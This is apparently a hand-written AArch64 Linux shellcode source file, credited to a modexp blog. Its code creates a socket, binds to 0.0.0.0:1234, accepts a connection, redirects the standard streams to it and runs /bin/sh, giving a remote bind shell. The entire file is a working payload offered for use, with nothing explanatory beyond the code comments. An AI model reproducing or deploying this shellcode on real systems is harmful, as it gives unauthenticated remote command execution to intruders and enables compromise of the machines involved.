/**
  bind shell to 0.0.0.0:1234
  tested with ubuntu/AArch64

  http://modexp.wordpress.com/   
*/

// 136 bytes
    .global _start
    .text

_start:
    // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    eor    x2, x2, x2   // x2 = IPPROTO_IP
    mov    x1, #1       // x1 = SOCK_STREAM
    mov    x0, #2       // x0 = AF_INET
    mov    x8, #198     // x8 = socket
    svc    0
    
    mov    x6, x0       // x6 = s
    
    // bind(s, &sa, sizeof(sa));  
    mov    x2, #16      // x2 = sizeof(sa)
    adr    x1, sin_port // x1 = &sa
    mov    x8, #200     // x8 = bind
    svc    0
  
    // listen(s, 0);
    eor    x1, x1, x1   // x1 = 0    
    mov    x0, x6       // x0 = s
    mov    x8, #201     // x8 = listen 
    svc    0    
    
    // r = accept(s, 0, 0);
    eor    x1, x1, x1
    eor    x2, x2, x2
    mov    x0, x6        // x0 = s
    mov    x8, #202      // x8 = accept    
    svc    0    
    
    mov    x6, x0        // x6 = r
    
    // dup2(r, FILENO_STDIN);
    // dup2(r, FILENO_STDOUT);
    // dup2(r, FILENO_STDERR);
    mov    x1, #2        // for 3 descriptors
dup_loop:
    mov    x0, x6        // x0 = r
    mov    x8, #24       // x8 = dup2 
    svc    0
    subs   x1, x1, #1    // subtract one
    bpl    dup_loop

    // execve("/bin/sh", NULL, NULL);    
    eor    x1, x1, x1
    adr    x0, sh        // x0 = "/bin/sh" 
    mov    x8, #221      // x8 = execve
    svc    0
sin_port:    
    .word  0xd2040002    // 1234, AF_INET
    .word  0x00000000    // INADDR_ANY
sh:    
    .ascii "/bin/sh\0"

